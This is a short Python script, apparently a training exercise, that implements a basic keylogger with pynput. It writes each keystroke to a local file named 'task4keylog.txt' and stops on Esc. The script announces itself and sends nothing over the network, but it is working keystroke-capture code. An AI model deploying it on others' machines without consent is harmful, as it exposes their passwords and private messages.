from pynput import keyboard
import logging

# Set up logging to a file
log_file = "task4keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(message)s')

def on_press(key):
    try:
        # Log the key as a character
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys
        logging.info(f" {key} ")

def on_release(key):
    # Stop listener by pressing the 'Esc' key
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger is running. Press 'Esc' to stop.")
    # Start listening to the keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
    
